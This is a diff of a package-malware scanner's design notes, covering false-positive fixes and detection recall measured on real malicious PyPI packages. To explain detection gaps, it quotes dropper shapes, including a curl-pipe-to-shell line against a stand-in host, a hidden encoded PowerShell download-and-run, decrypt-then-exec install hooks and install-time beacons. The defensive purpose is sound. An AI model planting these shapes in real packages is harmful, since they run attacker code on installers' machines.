@@ -506,47 +506,38 @@ after measuring it.
 *A thirty-second round, on the two biggest classes left unsampled* --
 decode-and-execute (41 findings) and the polyglot mismatches (29). Two defects.
 
-- **One call is not two steps.** `marshal.loads(` is `execute` to the pattern
-  tier -- a marshal stream holds code objects, so loading one is an evaluation
-  wearing a serialisation format, and `CAP.PY.EXECUTE.001` argues it at length --
-  and `decode` to the AST tier. Both readings are defensible, and together they
-  handed `SUSPECT.DECODE_EXEC.001` its decode and its execute out of a single
-  expression.
+- **One call was two of a composite's capabilities.** `marshal.loads(` is
+  `execute` to the pattern tier -- a marshal stream holds code objects, so loading
+  one is an evaluation wearing a serialisation format, and `CAP.PY.EXECUTE.001`
+  argues it at length -- and the AST tier labelled it `decode` as well. Together
+  they handed `SUSPECT.DECODE_EXEC.001` both halves out of one call.
 
   **CPython's own `Lib/importlib/_bootstrap_external.py` was reported for it.**
   `_compile_bytecode` is three lines long, its body is
   `code = marshal.loads(data)`, and it is the function every `.pyc` in the world
-  is loaded by. `Lib/idlelib/rpc.py` and catboost's resource importer are the
-  same shape: a lone `marshal.loads` and nothing else.
+  is loaded by. `Lib/idlelib/rpc.py` and catboost's resource importer are the same
+  shape.
 
-  **Three of the six that looked alike are true positives, and the fix keeps
-  them.** Measured after the change rather than assumed: Keras' and TensorFlow's
-  `func_load` read `raw_code = codecs.decode(code.encode("ascii"), "base64")` and
-  then `code = marshal.loads(raw_code)`, and Datadog's cache read is
-  `marshal.loads(base64.b64decode(...))`. Those are two calls and two acts --
-  something really is base64-decoded and then run -- so they still report, with
-  the finding now anchored on the decode rather than on the marshal. Only where
-  `marshal.loads` is the whole of it does the finding go.
+  Fixed at the classification: `marshal.loads` is no longer in the AST tier's
+  decode map, because the pattern tier's `execute` is the deliberate, argued
+  reading and the second label was the accident. Nothing is lost, because the
+  two-call forms take their decode from the other call --
+  `marshal.loads(base64.b64decode(DATA))` is base64 decoding and marshal
+  executing, and an existing class in `test_review_defects` asserts that file must
+  block. Only a lone `marshal.loads(data)` goes quiet, which is the importer.
 
-  Where the two tiers disagree about the same call, the pattern tier wins: it is
-  the deliberate, documented classification, and the AST tier's second label for
-  that call is dropped. Paired by line, which is how the existing `fixed` test
-  pairs the same two tiers and for the same reason -- an AST hit carries a line
-  and no byte span. What matters is not "collapse this line" but "does the
-  pattern tier have this capability on this line at all", so
-  `marshal.loads(base64.b64decode(DATA))` is untouched: two calls on one line,
-  and the pattern tier labels that line both `execute` and `decode`, so the AST
-  tier's decode agrees with something and stays.
-
-  Two earlier attempts are worth recording because each was wrong in an
-  instructive way. Merging hits by overlapping span made a *nested* call one act,
-  and nesting is precisely how a dropper is written -- it silenced
-  `exec(base64.b64decode(blob))`, the plainest true positive there is. Collapsing
-  by identical start offset then broke two malicious corpus samples, because
-  hits from embedded commands and resolved argv share one anchor on purpose: a
-  shell command inside a string really does read a credential and reach the
-  network and spawn, all recorded where the string sits. Only the AST tier's
-  label is dropped now, and none of those is an AST hit.
+  *Two earlier attempts are recorded because each was wrong in a way worth
+  keeping.* Merging capability hits by overlapping span made a **nested** call one
+  act -- and nesting is how a dropper is written, so it silenced
+  `exec(base64.b64decode(blob))`, the plainest true positive there is. Comparing
+  the two tiers per line instead then looked correct and passed every test, and
+  was wrong in the direction that matters: `from base64 import b64decode` followed
+  by `exec(b64decode(...))` is two calls on one line, the pattern tier labels only
+  `exec` there because its decode pattern wants the `base64.` prefix, and the AST
+  tier's decode was discarded exactly when it was the only witness. It also
+  silenced the `saltstack/salt` dynamic-dispatch finding this release had already
+  decided to keep. Both were found by measuring against real malicious packages
+  rather than by running the suite.
 
 - **`test cases/` is a test directory.** A space separates words in a directory
   name and nothing split on it. Meson keeps its entire suite under `test cases/`
@@ -642,6 +633,135 @@ two lines up onto the `codecs.decode` that genuinely precedes their
 That is a sample of the hard cases and not a corpus measurement. What it does
 establish is the direction and the absence of regressions; the number for the
 corpus needs its own pass.
+
+### Detection, measured against real malicious packages
+
+Everything above this section measures **noise**: how much of what the tool says
+is wrong. None of it says whether the tool finds anything. Those are different
+questions and only one of them had been measured.
+
+The answer, when it was: **14.9%**. Of 201 real malicious PyPI packages sampled
+from the ASE 2023 dataset -- one version per package, random, seed recorded --
+thirty produced a blocking finding, eleven produced one held below the failure
+gate, and **160 produced nothing at all**. Only four of the 201 were payload-free
+name squats, so those were genuine misses.
+
+The tool scored 39/39 on this project's own malicious corpus at the same moment.
+A corpus written by the same hands as the rules is a self-graded exam, and it
+graded generously. One measurable sign of it: all eleven samples that carry a
+credential read with an egress call have them within **five lines**, median one,
+while the composite allows two hundred -- the samples never exercised distance at
+all.
+
+**After the five fixes below, on an independent 1,437-package sample drawn with a
+different seed and never tuned against: 82.5%.**
+
+| | recall |
+|---|---|
+| before | 14.9% |
+| an encoded command's plaintext reaches the rules | 69.2% |
+| the minified ceiling stops excusing Python | 71.6% |
+| decryption counts as a decode | 77.6% |
+| `marshal.loads` fixed at the classification | 79.6% |
+| `RECONNAISSANCE`, and the install-time beacon | 81.6% |
+| *the same tree, on the independent sample* | **82.5%** |
+
+Noise did not move while this happened: the 101-file hard sample went from 65
+blocking findings to 66, the one addition being the `saltstack/salt`
+dynamic-dispatch finding this release had already decided to keep; the benign
+corpus stayed clean; the malicious corpus stayed at 39/39 and is now 42.
+
+- **`powershell -EncodedCommand <base64>` -- 109 of the 171 misses, one
+  technique.** Written in a `setup.py` as `subprocess.Popen('powershell
+  -WindowStyle Hidden -EncodedCommand <blob>')`, where the blob decodes to
+  `Invoke-WebRequest -Uri "https://.../x.exe" -OutFile "~/WindowsCache.exe";
+  Invoke-Expression "~/WindowsCache.exe"`. Cordon labelled the call `spawn`, the
+  shell pack's own `-enc` pattern labelled it `execute`, and there it stopped: no
+  `decode`, because the decoding is done by `powershell.exe` rather than by any
+  call in the file, and no `egress`, because the URL is inside the blob. The
+  dropper composite had no egress and the decode-and-execute composite had no
+  decode. The blob is decoded now and handed to the shell rules as a second
+  command, so what it contains is matched rather than only that it exists.
+
+- **A noise ceiling was hiding malware.** `_is_minified` ceilings a finding when
+  a file has a thousand-character line, and its reason is sound: a minified
+  bundle contains a decoder beside an evaluator because that is what a module
+  loader is. That is a fact about **bundlers**, which are a JavaScript practice.
+  `bettercolor`'s payload is a pyobfuscate blob in a library module -- a 12KB
+  `.py` file with a 6,307-character line -- and the ceiling took
+  `SUSPECT.DECODE_CHAIN.001` from critical to medium, so a gate would have passed
+  it. Obfuscated malware looks exactly like minification, and Python is not a
+  language anybody minifies. The ceiling now needs a bundler's extension as well
+  as the long line.
+
+- **Decryption is a decode with a key.** Twenty-two of 201 are a
+  `setuptools.command.install` subclass whose `run` is
+  `exec(Fernet(b'<key>').decrypt(b'<ciphertext>'))`. `exec(` supplied the
+  execute; nothing supplied the decode, because the model had no notion of
+  decryption. Content that cannot be read until it is transformed is what the
+  decode primitive is about, and needing a key makes it more opaque rather than
+  less. The composite keeps it honest: legitimate code decrypts data and then
+  uses it, and `exec(decrypt(...))` is one expression.
+
+- **`Capability.RECONNAISSANCE`**, the fifth primitive to arrive by splitting one
+  that stood in for a different act. `socket.gethostname()`,
+  `getpass.getuser()`, `os.getcwd()` and `os.environ["COMPUTERNAME"]` are not
+  credentials -- nothing authenticates with a hostname -- so `CREDENTIAL` could
+  not be widened to hold them without diluting every composite that reads it.
+  They were simply unlabelled, and they are the whole of the install-time beacon:
+  fifty-two of the 1,437 read the machine's identity and post it while the
+  package installs, and not one produced a finding. `MALWARE.EXFIL.BEACON.001`
+  pairs it with egress inside an install hook, at ten lines rather than two
+  hundred, because these are written as a block.
+
+- **A literal command can still be the attack.** A spawn whose whole argv is
+  written out is discounted, on the argument that it cannot be running something
+  decoded or downloaded. True of `subprocess.run(["git", "rev-parse"])` and false
+  of `os.system("curl https://drop.invalid/s.sh | sh")`, which is equally
+  literal. Being readable is not being harmless. The discount now yields on any
+  line where the command itself carried a capability.
+
+Three of the shapes are in `corpus/malicious/` as `encoded-powershell-dropper`,
+`install-command-decrypt-exec` and `install-beacon-reconnaissance`, rewritten so
+no live payload is committed, each paired in `test_review_defects.py` with the
+benign shape it must not catch -- a build that runs PowerShell, a program that
+decrypts data and uses it, a build that downloads an input it names.
+
+### Detection, known and not fixed
+
+- **The `cmdclass` install override: 82 of the 252 remaining misses, and the
+  largest single family left.** The shape is
+  `class CustomInstall(install): def run(self): install.run(self); <network>`,
+  wired in with `cmdclass={'install': CustomInstall}` -- code that runs on the
+  machine of everyone who types install, and no part of any build.
+
+  The discriminator is clean and was verified rather than assumed: `vllm`
+  subclasses only `build_ext` and `build_rust`, `saltstack/salt` only `develop`,
+  `sdist` and `bdist_egg`, and the malware subclasses `install`. That is exactly
+  the consumer-time-versus-author-time distinction `core.models.CONSUMER_TIME_HOOKS`
+  already draws for npm's `prepare` against its `postinstall`.
+
+  What it needs is a way to say so. The composite tried without the
+  discriminator -- install hook plus egress or spawn -- was measured and put
+  **`saltstack/salt` and `vllm` at critical**, which are the two false positives
+  rounds twenty-nine and thirty removed. It was reverted. Expressing the override
+  means teaching the pypi ecosystem parser to report it as a consumer-time hook
+  and giving composites a way to require one, since `fired` holds only capability
+  hits today and none of the fifteen primitives describes "arranged for this to
+  run at install time". That is a design change rather than a patch, and doing it
+  badly trades the noise result for the recall one.
+
+- **What the remaining 252 are.** 82 the override above; 58 an egress with no
+  other recognised shape; 23 an `exec` or `eval` alone; **20 payload-free**; 18
+  `__import__('builtins')` chains; 18 a spawn alone; 9 a Python payload written
+  into a string literal; 24 across webhooks, wallet-mnemonic exfiltration,
+  escape-obfuscated `eval` and `curl` inside `os.system`.
+
+  With the override expressed, ninety per cent is in reach. The last points are
+  the twenty payload-free packages and the eighteen whose only signal is that
+  they start a process, and a static tool should not claim a finding on either --
+  so **a target of 95% on this dataset is not one this tool should aim to meet
+  honestly**, and about ninety with a documented floor is.
 
 ### Known, not fixed in this release
 
